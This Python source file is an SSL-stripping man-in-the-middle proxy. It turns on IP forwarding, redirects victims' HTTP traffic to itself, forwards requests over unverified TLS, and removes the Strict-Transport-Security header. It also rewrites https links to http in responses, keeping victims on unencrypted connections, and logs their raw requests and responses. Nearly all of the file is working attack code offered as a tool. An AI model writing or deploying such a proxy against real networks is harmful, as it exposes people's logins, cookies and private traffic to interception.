import socket
import ssl
import threading
import subprocess
from rules import enable_ip_forwarding, redirect_http_traffic, flush_rules
from full_http import read_full_http_request, read_full_http_response

REMOVED_REQUEST_HEADERS = [
    b"connection",
    b"proxy-connection",
    b"keep-alive",
    b"transfer-encoding",
    b"te",
    b"trailer",
    b"upgrade",
]

REMOVED_RESPONSE_HEADERS = [
    b"strict-transport-security",
    b"transfer-encoding",
    b"content-length",
    b"connection"
]

def split_host_port(host_header: str, default_port=443):
    # host_header can be "example.com" or "example.com:8080"
    if host_header.startswith("["): # for IPv6 (not tested)
        h, _, rest = host_header[1:].partition("]")
        if rest.startswith(":"):
            return h, int(rest[1:])
        return h, default_port

    if ":" in host_header:
        h, p = host_header.rsplit(":", 1)
        if p.isdigit():
            return h, int(p)
    return host_header, default_port

def handle_client(client_sock: socket.socket):
    upstream = None
    try:
        # Get full request
        request_first_line, request_headers_dict, request_body = read_full_http_request(client_sock)
        
        # Rebuild request
        headers_lines = [request_first_line]
        for k, v in request_headers_dict.items():
            # skip removed request headers
            if k in REMOVED_REQUEST_HEADERS:
                continue
            headers_lines.append(k + b": " + v)

        # Add header to close connection after response
        headers_lines.append(b"Connection: close")

        # Add all headers lines into new_request_headers
        new_request_headers = b"\r\n".join(headers_lines)

        # Replace all "http://" instances with "https://" in the new_request_headers (because we will send this through https to the website)
        new_request_headers = new_request_headers.replace(b"http://", b"https://")

        # Finally, add the modified new_request_headers and the request_body into the final out_request
        out_request = new_request_headers + b"\r\n\r\n" + request_body

        print("===========================================================")
        print(f"======== HTTP REQUEST (raw) ========")
        preview = out_request[:200]
        print(preview.decode("iso-8859-1", errors="replace"))
        if len(out_request) > len(preview):
            print(f"\n... [truncated preview: total {len(out_request)} bytes] ...")
        print(f"======== END OF HTTP REQUEST (raw) ========\n")

        # Get the host as string
        host = request_headers_dict.get(b"host")
        if not host:
            return
        host = host.decode("iso-8859-1")

        # Connect via SSL to the host
        up_host, up_port = split_host_port(host, 443)
        # context = ssl.create_default_context()
        context = ssl._create_unverified_context() # does not verify the context and gives less errors
        upstream_sock = socket.create_connection((up_host, up_port), timeout=50)
        upstream = context.wrap_socket(upstream_sock, server_hostname=up_host)

        # Send the out_request to the website
        upstream.sendall(out_request)
        print("request sent to the website")

        # Get full response
        response_first_line, response_headers_dict, response_body = read_full_http_response(upstream)

        # Rebuild response
        headers_lines = [response_first_line]
        for k, v in response_headers_dict.items():
            # skip removed response headers
            if k in REMOVED_RESPONSE_HEADERS:
                continue
            headers_lines.append(k + b": " + v)

        # Add Content-Length header using the length of the response_body
        headers_lines.append(b"Content-Length: " + str(len(response_body)).encode("ascii"))
        
        # Add header to close connection after response
        headers_lines.append(b"Connection: close")

        # Add all headers_lines into new_response_headers 
        new_response_headers = b"\r\n".join(headers_lines)

        # Replace all "https://" instances with "http://" (because we will send this through http to the client)
        new_response_headers = new_response_headers.replace(b"https://", b"http://")

        # Finally, add the modified new_response_headers and the response_body into the final out_response
        out_response = new_response_headers + b"\r\n\r\n" + response_body

        print("======== FULL HTTP RESPONSE (raw) ========")
        preview = out_response[:800]
        print(preview.decode("iso-8859-1", errors="replace"))
        if len(out_response) > len(preview):
            print(f"\n... [truncated preview: total {len(out_response)} bytes] ...")
        print("======== END OF HTTP RESPONSE (raw) ========")

        # Send out the response to the client
        client_sock.sendall(out_response)
        print("response sent to the client")
        print("===========================================================")

        if upstream is not None:
            upstream.close()

    finally:
        if upstream is not None:
            upstream.close()
        client_sock.close()

def serve(host="0.0.0.0", port=8080):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((host, port))
    srv.listen(200)
    print(f"Proxy listening on {host}:{port}")

    while True:
        client, _ = srv.accept()
        threading.Thread(target=handle_client, args=(client,), daemon=True).start()

def main():
    try:
        enable_ip_forwarding()
        redirect_http_traffic()

        print("[*] SSL Stripping started.")
        
        serve()

    except KeyboardInterrupt:
        print("\n[!] Stopping...")

    except Exception as e:
        print(f"\n[!] An error occurred: {e}")

    finally:
        # This block ALWAYS runs, even if the script crashes or we hit Ctrl+C
        flush_rules()

# Main Execution
if __name__ == "__main__":
    main()